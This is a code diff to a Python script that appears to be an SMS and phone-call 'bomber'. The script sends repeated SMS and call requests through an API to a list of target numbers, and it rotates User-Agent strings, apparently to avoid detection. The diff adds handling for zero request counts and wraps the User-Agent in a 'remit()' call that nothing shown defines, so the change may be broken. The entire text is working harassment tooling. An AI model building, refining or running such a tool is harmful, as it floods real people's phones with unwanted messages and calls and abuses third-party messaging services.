@@ -53,7 +53,7 @@ def validate_phone(phone):
 def send_request(phone, request_type):
     url = API["url"]
     params = {key: value.replace("{number}", phone).replace("{type}", request_type) for key, value in API["params"].items()}
-    headers = {"User-Agent": random.choice(USER_AGENTS)}
+    headers = {"User-Agent": remit(random.choice(USER_AGENTS))}
 
     try:
         response = requests.get(url, params=params, headers=headers, timeout=10)
@@ -118,8 +118,17 @@ def main():
 
     request_counter = 0
     for phone in phone_numbers:
-        request_list = [("sms", API) for _ in range(sms_count)] + [("call", API) for _ in range(call_count)]
+        # Only include request types with count > 0
+        request_list = []
+        if sms_count > 0:
+            request_list.extend([("sms", API) for _ in range(sms_count)])
+        if call_count > 0:
+            request_list.extend([("call", API) for _ in range(call_count)])
         random.shuffle(request_list)
+
+        if not request_list:
+            print(f"{Colors.RED}No requests to send for {phone}!{Colors.RESET}")
+            continue
 
         print(f"\n{Colors.CYAN}Bombing number: {phone}{Colors.RESET}")
         for request_type, _ in request_list:
